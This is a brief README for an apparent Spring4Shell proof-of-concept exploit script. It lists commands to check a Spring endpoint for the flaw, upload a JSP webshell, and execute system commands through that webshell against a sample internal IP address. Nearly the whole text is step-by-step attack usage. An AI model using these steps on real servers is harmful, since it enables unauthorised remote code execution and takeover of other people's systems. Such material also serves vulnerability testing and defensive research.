Simple Spring4Shell POC 
-----------------------

* Check if endpoint is vulnerable 

`python spring4shell.py -u http://192.168.110.117:8080/helloworld/greeting --check`

* Exploit vulnerable endpoint

`python spring4shell.py -u http://192.168.110.117:8080/helloworld/greeting -f shell.jsp --exploit`

* Execute command on uploaded webshell

`python spring4shell.py -u http://192.168.110.117:8080/shell.jsp --cmd id`

![WebPage](spring4shell.png?raw=true)

